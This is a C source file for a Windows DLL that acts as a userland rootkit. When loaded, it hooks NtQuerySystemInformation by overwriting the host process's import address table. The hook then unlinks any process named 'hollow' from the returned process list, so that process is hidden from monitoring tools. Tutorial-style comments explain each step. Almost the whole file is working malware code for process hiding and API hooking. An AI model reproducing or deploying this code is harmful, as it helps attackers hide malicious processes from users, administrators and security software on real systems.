#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	ULONG BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");

NTSTATUS WINAPI HookedNtQuerySystemInformation(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
) {
	NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength); //We call the original NtQuerySystemInformation function to get its status

	//We check if the status is successful
	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status) {
		//We declare a system process information structure (placeholders for the current and the next one)
		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
		//We loop through the list of processes
		do {
			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset); 

			//We check the next placeholder
			if (!wcsncmp(pNext->ImageName.Buffer, L"hollow", pNext->ImageName.Length)) {
				if (!pNext->NextEntryOffset)
					pCurrent->NextEntryOffset = 0; //When we find the program that we want, we set to 0 the value to exit from the loop 
				else
					pCurrent->NextEntryOffset += pNext->NextEntryOffset; //If we don't find the program, we skip on to the next one
			}
		} while (pCurrent->NextEntryOffset != 0);
	}
	return status;
}


void StartHook() {
	MODULEINFO modInfo = { 0 };
	HMODULE hModule = GetModuleHandle(0);

	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO)); //Obtain the adress (module information) with GetModuleHandle() of the GetCurrentPRocess() function 

	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll; //Find the base of the module/memory
	//With the pAddress information, parse the PE header
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddress; 
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAddress + pIDH->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);
	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	//Section of the PE header that contains information about functions and libraries, we loop through to find ntdll library
	for (; pIID->Characteristics; pIID++) {
		if (!strcmp("ntdll.dll", (char*)(pAddress + pIID->Name))) //ntdll library contains the function that we want to hook
			break;
	}

	//Creat the structures that loop through and look for the desired functions (we search NtQuerySystemInformation)
	PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAddress + pIID->FirstThunk);
	PIMAGE_IMPORT_BY_NAME pIIBM;

	for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
		pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);

		if (!strcmp("NtQuerySystemInformation", (char*)pIIBM->Name)) 
			break;

		pFirstThunkTest++;
	}

	//We write our hook function address, to do so we write over function pointer
	DWORD dwOld = NULL;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &dwOld);
	pFirstThunkTest->u1.Function = (uintptr_t)HookedNtQuerySystemInformation;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(uintptr_t), dwOld, NULL);

	CloseHandle(hModule);
}

bool _stdcall DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		StartHook(); //Call the function hook  
		break;
	}

	return TRUE;
}